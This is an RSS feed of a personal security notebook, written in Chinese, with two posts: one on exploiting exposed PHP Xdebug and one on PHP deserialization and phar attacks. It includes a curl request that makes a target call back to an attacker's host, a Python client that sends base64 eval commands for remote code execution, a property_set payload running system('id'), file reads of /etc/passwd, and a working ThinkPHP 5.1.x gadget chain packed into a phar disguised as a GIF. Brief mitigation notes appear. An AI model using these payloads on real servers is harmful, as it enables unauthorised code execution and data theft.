<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Codiy's Notebook – Security</title><link>https://note.codiy.net/docs/security/</link><description>Recent content in Security on Codiy's Notebook</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://note.codiy.net/docs/security/index.xml" rel="self" type="application/rss+xml"/><item><title>Docs: Php Xdebug</title><link>https://note.codiy.net/docs/2022/01/php-xdebug/</link><pubDate>Tue, 18 Jan 2022 10:41:58 +0800</pubDate><guid>https://note.codiy.net/docs/2022/01/php-xdebug/</guid><description>
&lt;blockquote>
&lt;p>温馨提示: &lt;strong>放置到公网的 PHP 环境，请务必关闭 Xdebug.&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;h2 id="xdebug-调试-php">Xdebug 调试 PHP&lt;/h2>
&lt;ul>
&lt;li>配置 &lt;a href="https://xdebug.org/docs/all_settings#mode">&lt;code>xdbeug.mode&lt;/code>&lt;/a> 可设置 xdebug 开启的模式.&lt;/li>
&lt;li>配置 &lt;a href="https://xdebug.org/docs/all_settings#start_with_request">&lt;code>xdebug.start_with_request&lt;/code>&lt;/a> 可通过设置请求参数 &lt;code>XDEBUG_SESSION_START=phpstrom&lt;/code> 或者设置环境变量
&lt;code>XDEBUG_SESSION=1&lt;/code> 或者设置请求头信息 &lt;code>Cookie: XDEBUG_SESSION=start&lt;/code> 等方式开启 xdebug&lt;/li>
&lt;li>配置 &lt;a href="https://xdebug.org/docs/all_settings#discover_client_host">&lt;code>xdebug.discover_client_host&lt;/code>&lt;/a>, 支持通过 &lt;code>X-Forwarded-For&lt;/code> 头信息获取调试客户端的地址&lt;/li>
&lt;li>配置 &lt;code>xdebug.client_host&lt;/code>, &lt;code>xdebug.client_port&lt;/code> 指定调试客户端的地址和端口&lt;/li>
&lt;li>Xdebug 支持 &lt;a href="https://xdebug.org/docs/dbgp">&lt;code>dbgp 调试协议&lt;/code>&lt;/a>, 可以用来进行&lt;strong>源码阅读&lt;/strong>, &lt;strong>执行 eval 指令&lt;/strong>, &lt;strong>开启交互式 shell&lt;/strong> 等危险操作&lt;/li>
&lt;li>Xdebug 的一般配置&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#658b00">zend_extension&lt;/span>=&lt;span style="color:#cd5555">xdebug.so&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[xdebug]&lt;/span>
&lt;span style="color:#658b00">xdebug.mode&lt;/span>=&lt;span style="color:#cd5555">debug&lt;/span>
&lt;span style="color:#658b00">xdebug.start_with_request&lt;/span>=&lt;span style="color:#cd5555">trigger ; start only XDEBUG_SESSION or XDEBUG_TRIGGER environment varibale is set&lt;/span>
&lt;span style="color:#658b00">xdebug.discover_client_host&lt;/span>=&lt;span style="color:#cd5555">yes&lt;/span>
&lt;span style="color:#658b00">xdebug.client_host&lt;/span>=&lt;span style="color:#cd5555">host.docker.internal&lt;/span>
&lt;span style="color:#658b00">xdebug.client_port&lt;/span>=&lt;span style="color:#cd5555">9000&lt;/span>
&lt;span style="color:#658b00">xdebug.idekey&lt;/span>=&lt;span style="color:#cd5555">VSCODE&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="xdebug-dbgp-协议">Xdebug DBGp 协议&lt;/h2>
&lt;p>通过阅读 &lt;a href="https://xdebug.org/docs/dbgp">DBGp&lt;/a> 的文档，我们可以注意到一些比较敏感的命令。&lt;/p>
&lt;ul>
&lt;li>Core Commands &amp;gt; source&lt;/li>
&lt;li>Extended Commands &amp;gt; eval&lt;/li>
&lt;li>Extended Commands &amp;gt; interact - Interactive Shell&lt;/li>
&lt;li>Core Commands &amp;gt; property_set&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>1. &lt;code>source -i transaction_id -f FILE_URI&lt;/code>&lt;/strong>&lt;/p>
&lt;p>&lt;code>transaction_id&lt;/code> 貌似没有那么硬性的要求，每次都为 1 即可 FILE_URI 是要读取的文件的路径，需要注意的是
Xdebug 也受限于 &lt;code>open_basedir&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>source -i 1 -f file:///etc/passwd
&lt;/code>&lt;/pre>&lt;p>此处也可以用 &lt;code>php://PHP_SCRIPT_LOCATION&lt;/code> 来读取文件, 因而也可能用来发起 &lt;strong>SSRF&lt;/strong> 攻击&lt;/p>
&lt;p>&lt;strong>2. &lt;code>eval -i transaction_id -- {DATA}&lt;/code>&lt;/strong>&lt;/p>
&lt;p>&lt;code>{DATA}&lt;/code> 为 base64 过的 PHP 代码。&lt;/p>
&lt;p>&lt;strong>3. interact&lt;/strong>&lt;/p>
&lt;p>暂未研究&lt;/p>
&lt;p>&lt;strong>4. property_set&lt;/strong>&lt;/p>
&lt;p>根据 Xdebug 实现的 dbgp 协议, property_set 存在一处执行 evel 命令的入口, 详见源码 &lt;a href="https://github.com/xdebug/xdebug/blob/master/src/debugger/handler_dbgp.c#L1628-L1630">handler_dbgp.c&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#228b22">/* Do the eval */&lt;/span>
eval_string = xdebug_sprintf(&lt;span style="color:#cd5555">&amp;#34;%s = %s %s&amp;#34;&lt;/span>, CMD_OPTION_CHAR(&lt;span style="color:#cd5555">&amp;#39;n&amp;#39;&lt;/span>), cast_as, new_value);
res = xdebug_do_eval(eval_string, &amp;amp;ret_zval);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>利用方式:&lt;/p>
&lt;pre tabindex="0">&lt;code>property_set -n $a -i 1 -c 1 -- c3lzdGVtKCJpZCIpOw==
property_get -n $a -i 1 -c 1 -p 0
&lt;/code>&lt;/pre>&lt;h2 id="服务器-xdebug-嗅探">服务器 Xdebug 嗅探&lt;/h2>
&lt;p>通过一条 &lt;strong>CURL&lt;/strong> 指令即可嗅探目标服务器是否开启了 &lt;strong>Xdebug&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -v &lt;span style="color:#cd5555">&amp;#34;http://&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">TARGET_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">/?XDEBUG_SESSION_START=phpstrom&amp;#34;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;X-Forwarded-For: &lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">XDEBUG_CLIENT_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;Cookie: XDEBUG_SESSION=start&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>原理简介:&lt;/strong> 服务器端开启了 Xdebug 在收到请求时, 发现请求携带了 &lt;code>XDEBUG_SESSION_START&lt;/code> 参数或者 &lt;code>Cookie: XDEBUG_SESSION=start&lt;/code>
头信息, 会尝试用 &lt;code>X-Forwarded-For&lt;/code> 所指定的地址作为 Xdebug 的远端(xdebug client), 向其发起连接, 连接的端口为 &lt;code>xdebug.client_port&lt;/code>
设置的值.&lt;/p>
&lt;h2 id="配置-xdebug-client">配置 Xdebug Client&lt;/h2>
&lt;p>即用来与目标机器 xdebug 交互的 client.&lt;/p>
&lt;h3 id="方式一-简单的通过-nc-命令-监听常见的-xdebug-client-端口-9000-9003">方式一: 简单的通过 &lt;strong>&lt;code>nc&lt;/code>&lt;/strong> 命令, 监听常见的 xdebug client 端口 &lt;strong>&lt;code>9000&lt;/code>&lt;/strong>, &lt;strong>&lt;code>9003&lt;/code>&lt;/strong>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">nc -lvv &lt;span style="color:#b452cd">9000&lt;/span>
nc -lvv &lt;span style="color:#b452cd">9003&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行 &lt;strong>CURL&lt;/strong> 嗅探请求, 当 &lt;strong>nc&lt;/strong> 回显出类似如下的 xml 文档，即说明目标机器 xdebug 处于可利用状态.
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/uncataloged/2022-01/18131632.png"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="方式二-利用脚本文件-实现当-xdebug-与-client-建立连接后-client-交互式的发送指令给目标机器">方式二: 利用脚本文件, 实现当 xdebug 与 client 建立连接后, client 交互式的发送指令给目标机器&lt;/h3>
&lt;p>xdebug.py&lt;/p>
&lt;pre tabindex="0">&lt;code>#!/usr/bin/python3
import socket
import base64
ip_port = ('0.0.0.0',9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()
while True:
client_data = conn.recv(1024)
print(&amp;quot;&amp;lt;&amp;lt;\n&amp;quot;)
print(client_data)
print(&amp;quot;\n&amp;quot;)
data = input('&amp;gt;&amp;gt; ')
data = base64.b64encode(data.encode('utf-8'))
print('eval -i 1 -- %s\x00' % data.decode('utf-8'))
conn.sendall(('eval -i 1 -- %s\x00' % data.decode('utf-8')).encode('utf-8'))
&lt;/code>&lt;/pre>&lt;h3 id="利用-gofrp6-实现将本机作为-xdebug-client-方便调试">利用 &lt;strong>&lt;a href="https://github.com/fatedier/frp">gofrp&lt;/a>&lt;/strong> 实现将本机作为 &lt;strong>xdebug client&lt;/strong>, 方便调试&lt;/h3>
&lt;p>frps.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#228b22">; frps.ini&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[common]&lt;/span>
&lt;span style="color:#658b00">bind_port&lt;/span> = &lt;span style="color:#cd5555">7000&lt;/span>
&lt;span style="color:#658b00">kcp_bind_port&lt;/span> = &lt;span style="color:#cd5555">7000&lt;/span>
&lt;span style="color:#658b00">token&lt;/span> = &lt;span style="color:#cd5555">whatthefuck&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>fprc.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#228b22">; frpc.ini&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[common]&lt;/span>
&lt;span style="color:#658b00">server_addr&lt;/span> = &lt;span style="color:#cd5555">xxx.xxx.xxx.xxx&lt;/span>
&lt;span style="color:#658b00">server_port&lt;/span> = &lt;span style="color:#cd5555">7000&lt;/span>
&lt;span style="color:#658b00">token&lt;/span> = &lt;span style="color:#cd5555">whatthefuck&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[tcp_9000]&lt;/span>
&lt;span style="color:#658b00">type&lt;/span> = &lt;span style="color:#cd5555">tcp&lt;/span>
&lt;span style="color:#658b00">local_port&lt;/span> = &lt;span style="color:#cd5555">9000&lt;/span>
&lt;span style="color:#8b008b;font-weight:bold">[tcp_9003]&lt;/span>
&lt;span style="color:#658b00">type&lt;/span> = &lt;span style="color:#cd5555">tcp&lt;/span>
&lt;span style="color:#658b00">local_port&lt;/span> = &lt;span style="color:#cd5555">9003&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>运行命令启动 client&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>python3 xdebug.py
frpc -c ./frpc.ini
&lt;/code>&lt;/pre>&lt;p>接着即可用 &lt;strong>CURL&lt;/strong> 嗅探指令来建立 xdebug 连接, 注意 &lt;code>X-Forwarded-For&lt;/code> 应当指定为 &lt;strong>frps&lt;/strong> 服务器地址&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -v &lt;span style="color:#cd5555">&amp;#34;http://&lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">TARGET_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">/?XDEBUG_SESSION_START=phpstrom&amp;#34;&lt;/span> &lt;span style="color:#cd5555">\
&lt;/span>&lt;span style="color:#cd5555">&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;X-Forwarded-For: &lt;/span>&lt;span style="color:#cd5555">${&lt;/span>&lt;span style="color:#00688b">FRPS_HOST&lt;/span>&lt;span style="color:#cd5555">}&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> -H &lt;span style="color:#cd5555">&amp;#34;Cookie: XDEBUG_SESSION=start&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/uncataloged/2022-01/18174747.png"
alt=""
/>
&lt;/p>&lt;/p></description></item><item><title>Docs: Exploiting PHP deserialization And SSRF</title><link>https://note.codiy.net/docs/2021/02/php-deserialization-and-ssrf-exploiting/</link><pubDate>Sat, 27 Feb 2021 09:16:52 +0800</pubDate><guid>https://note.codiy.net/docs/2021/02/php-deserialization-and-ssrf-exploiting/</guid><description>
&lt;h2 id="1---反序列化利用链">1 - 反序列化利用链&lt;/h2>
&lt;h3 id="11-基础知识和原理">1.1 基础知识和原理&lt;/h3>
&lt;ul>
&lt;li>反序列化会从给定的&lt;strong>序列化串&lt;/strong>来还原对象,并调用 &lt;code>__wakeup&lt;/code> 来做唤醒工作, 而不调用 &lt;code>__construct&lt;/code> 来初始化对象&lt;/li>
&lt;li>还原的对象会带上序列化时指定的属性, 这部分可被利用来作为&lt;strong>恶意代码输入点&lt;/strong>.&lt;/li>
&lt;li>恶意代码仅放在属性中并不会被执行, 所以一般利用 &lt;code>__destruct&lt;/code> 在对象销毁的时候,通过巧妙构造传递属性来让恶意代码被执行, 这中间可能还需要借助其他类对象.&lt;/li>
&lt;li>因此, 只要存在受用户控制的&lt;strong>反序列化入口&lt;/strong>, 即可通过特别构造的&lt;strong>序列化串&lt;/strong>来达到搞事情的目的.&lt;/li>
&lt;/ul>
&lt;h3 id="12-利用形式反序列化入口">1.2 利用形式(反序列化入口)&lt;/h3>
&lt;ul>
&lt;li>直接调用反序列化函数, &lt;code>unserialize(base64_decode($_POST['serialized_string']));&lt;/code>&lt;/li>
&lt;li>下列函数在载入&lt;code>phar&lt;/code> 时候也会触发反序列化, 如 &lt;code>is_dir('phar://phar.gif')&lt;/code>&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>column1&lt;/th>
&lt;th>column2&lt;/th>
&lt;th>column3&lt;/th>
&lt;th>column4&lt;/th>
&lt;th>column5&lt;/th>
&lt;th>column6&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>fileatime&lt;/td>
&lt;td>filectime&lt;/td>
&lt;td>filemtime&lt;/td>
&lt;td>file_exists&lt;/td>
&lt;td>file_get_contents&lt;/td>
&lt;td>file_put_contents&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>file&lt;/td>
&lt;td>filegroup&lt;/td>
&lt;td>fopen&lt;/td>
&lt;td>fileinode&lt;/td>
&lt;td>fileowner&lt;/td>
&lt;td>fileperms&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>is_dir&lt;/td>
&lt;td>is_file&lt;/td>
&lt;td>is_link&lt;/td>
&lt;td>is_executable&lt;/td>
&lt;td>is_readable&lt;/td>
&lt;td>is_writeable&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>is_wirtble&lt;/td>
&lt;td>parse_ini_file&lt;/td>
&lt;td>copy&lt;/td>
&lt;td>unlink&lt;/td>
&lt;td>stat&lt;/td>
&lt;td>readfile&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>&lt;code>phar&lt;/code> 文件本地生成需 &lt;code>php.ini&lt;/code> 设置 &lt;code>phar.readonly = 0&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="13-利用链">1.3 利用链&lt;/h3>
&lt;ul>
&lt;li>常见起点&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">__wakeup &lt;span style="color:#228b22">// 一定会调用, 反序列化为对象时
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__destruct &lt;span style="color:#228b22">// 一定会调用, 对象被销毁时
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__toString &lt;span style="color:#228b22">// 当一个对象被反序列化后又被当做字符串使用
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>常见中间跳板&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">__toString &lt;span style="color:#228b22">// 当一个对象被当做字符串使用
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__get &lt;span style="color:#228b22">// 读取不可访问或不存在属性时被调用
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__set &lt;span style="color:#228b22">// 当给不可访问或不存在属性赋值时被调用
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
__isset &lt;span style="color:#228b22">// 对不可访问或不存在的属性调用isset()或empty()时被调用
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>常见终点&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">__call &lt;span style="color:#228b22">// 调用不可访问或不存在的方法时被调用
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
call_user_func &lt;span style="color:#228b22">// 一般php代码执行都会选择这里
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
call_user_func_array &lt;span style="color:#228b22">// 一般php代码执行都会选择这里
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
&lt;span style="color:#00688b">$closure&lt;/span>(&lt;span style="color:#00688b">$value&lt;/span>, &lt;span style="color:#00688b">$params&lt;/span>); &lt;span style="color:#228b22">//
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="14-生成-phar-文件">1.4 生成 &lt;code>phar&lt;/code> 文件&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">@unlink(&lt;span style="color:#cd5555">&amp;#34;phar.gif&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> \Phar(&lt;span style="color:#cd5555">&amp;#34;phar.phar&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">startBuffering&lt;/span>();
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">setStub&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;GIF89a&amp;#34;&lt;/span>.&lt;span style="color:#cd5555">&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;&lt;/span>); &lt;span style="color:#228b22">//设置stub
&lt;/span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#00688b">$o&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> Xxxx(); &lt;span style="color:#228b22">// 要序列化的对象
&lt;/span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">setMetadata&lt;/span>(&lt;span style="color:#00688b">$o&lt;/span>); &lt;span style="color:#228b22">//将自定义meta-data存入manifest
&lt;/span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">addFromString&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;test.txt&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;test&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">stopBuffering&lt;/span>();
rename(&lt;span style="color:#cd5555">&amp;#34;phar.phar&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;phar.gif&amp;#34;&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="15-thinkphp-51x-版本反序列化利用链httpsnikoeurusgithubio20191231thinkphp2051xe58f8de5ba8fe58897e58c96">1.5 &lt;a href="https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp 5.1.x 版本反序列化利用链&lt;/a>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&amp;lt;?php
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> think\process\pipes{
&lt;span style="color:#8b008b;font-weight:bold">class&lt;/span> &lt;span style="color:#008b45;font-weight:bold">Windows&lt;/span>
{
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$files&lt;/span> = [];
}
}
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> think\model\concern{
&lt;span style="color:#8b008b;font-weight:bold">trait&lt;/span> Conversion
{
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$visible&lt;/span> = [];
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$relation&lt;/span> = [];
}
&lt;span style="color:#8b008b;font-weight:bold">trait&lt;/span> Attribute
{
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$data&lt;/span> = [];
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#00688b">$withAttr&lt;/span> = [];
}
}
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> think{
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> think\model\concern\Conversion;
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> think\model\concern\Attribute;
&lt;span style="color:#8b008b;font-weight:bold">abstract&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">class&lt;/span> &lt;span style="color:#008b45;font-weight:bold">Model&lt;/span>
{
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> Conversion;
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> Attribute;
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> __construct(&lt;span style="color:#00688b">$relation&lt;/span>=[],&lt;span style="color:#00688b">$visible&lt;/span>=[],&lt;span style="color:#00688b">$data&lt;/span>=[],&lt;span style="color:#00688b">$withAttr&lt;/span>=[])
{
&lt;span style="color:#00688b">$this&lt;/span>-&amp;gt;&lt;span style="color:#658b00">relation&lt;/span> = &lt;span style="color:#00688b">$relation&lt;/span>;
&lt;span style="color:#00688b">$this&lt;/span>-&amp;gt;&lt;span style="color:#658b00">visible&lt;/span> = &lt;span style="color:#00688b">$visible&lt;/span>;
&lt;span style="color:#00688b">$this&lt;/span>-&amp;gt;&lt;span style="color:#658b00">data&lt;/span> = &lt;span style="color:#00688b">$data&lt;/span>;
&lt;span style="color:#00688b">$this&lt;/span>-&amp;gt;&lt;span style="color:#658b00">withAttr&lt;/span> = &lt;span style="color:#00688b">$withAttr&lt;/span>;
}
}
}
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> think\model{
&lt;span style="color:#8b008b;font-weight:bold">use&lt;/span> think\Model;
&lt;span style="color:#8b008b;font-weight:bold">class&lt;/span> &lt;span style="color:#008b45;font-weight:bold">Pivot&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">extends&lt;/span> Model{
&lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> &lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> __construct(&lt;span style="color:#00688b">$relation&lt;/span>=[],&lt;span style="color:#00688b">$visible&lt;/span>=[],&lt;span style="color:#00688b">$data&lt;/span>=[],&lt;span style="color:#00688b">$withAttr&lt;/span>=[])
{
&lt;span style="color:#8b008b;font-weight:bold">parent&lt;/span>::&lt;span style="color:#658b00">__construct&lt;/span>(&lt;span style="color:#00688b">$relation&lt;/span>,&lt;span style="color:#00688b">$visible&lt;/span>,&lt;span style="color:#00688b">$data&lt;/span>,&lt;span style="color:#00688b">$withAttr&lt;/span>);
}
}
}
&lt;span style="color:#8b008b;font-weight:bold">namespace&lt;/span> {
&lt;span style="color:#00688b">$relation&lt;/span> = [];
&lt;span style="color:#00688b">$visible&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">array&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;abc&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$data&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">array&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;abc&amp;#34;&lt;/span> =&amp;gt; &lt;span style="color:#cd5555">&amp;#34;echo &amp;#39;hacked&amp;#39; &amp;gt; ./uploads/hacked.txt&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$withAttr&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">array&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;abc&amp;#34;&lt;/span>=&amp;gt;&lt;span style="color:#cd5555">&amp;#34;system&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$pivot&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> think\model\Pivot(&lt;span style="color:#00688b">$relation&lt;/span>,&lt;span style="color:#00688b">$visible&lt;/span>,&lt;span style="color:#00688b">$data&lt;/span>,&lt;span style="color:#00688b">$withAttr&lt;/span>);
&lt;span style="color:#00688b">$windows&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> think\process\pipes\Windows();
&lt;span style="color:#00688b">$windows&lt;/span>-&amp;gt;&lt;span style="color:#658b00">files&lt;/span> = [&lt;span style="color:#00688b">$pivot&lt;/span>];
&lt;span style="color:#228b22">// 形式一: 直接序列化
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#228b22">// echo base64_encode(serialize($windows));
&lt;/span>&lt;span style="color:#228b22">&lt;/span>
&lt;span style="color:#228b22">// 形式二: 序列化后存入 phar 的 Metadata
&lt;/span>&lt;span style="color:#228b22">&lt;/span> @unlink(&lt;span style="color:#cd5555">&amp;#34;phar.gif&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span> = &lt;span style="color:#8b008b;font-weight:bold">new&lt;/span> \Phar(&lt;span style="color:#cd5555">&amp;#34;phar.phar&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">startBuffering&lt;/span>();
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">setStub&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;GIF89a&amp;#34;&lt;/span>.&lt;span style="color:#cd5555">&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;&lt;/span>); &lt;span style="color:#228b22">//设置stub
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">setMetadata&lt;/span>(&lt;span style="color:#00688b">$windows&lt;/span>); &lt;span style="color:#228b22">//将自定义meta-data存入manifest
&lt;/span>&lt;span style="color:#228b22">&lt;/span> &lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">addFromString&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;test.txt&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;test&amp;#34;&lt;/span>);
&lt;span style="color:#00688b">$phar&lt;/span>-&amp;gt;&lt;span style="color:#658b00">stopBuffering&lt;/span>();
rename(&lt;span style="color:#cd5555">&amp;#34;phar.phar&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;phar.gif&amp;#34;&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="16-如何规避">1.6 如何规避&lt;/h3>
&lt;ul>
&lt;li>杜绝反序列化利用链的存在&lt;/li>
&lt;li>任何函数调用, 特别是 1.2 中列举的函数, 应避免直接接收用户输入&lt;/li>
&lt;/ul>
&lt;h2 id="2---ssrf漏洞">2 - SSRF漏洞&lt;/h2>
&lt;blockquote>
&lt;p>参考1: &lt;a href="https://xz.aliyun.com/t/5665">https://xz.aliyun.com/t/5665&lt;/a>
参考2: &lt;a href="https://xz.aliyun.com/t/8613">https://xz.aliyun.com/t/8613&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/security/2021-02/ssrf.png"
alt=""
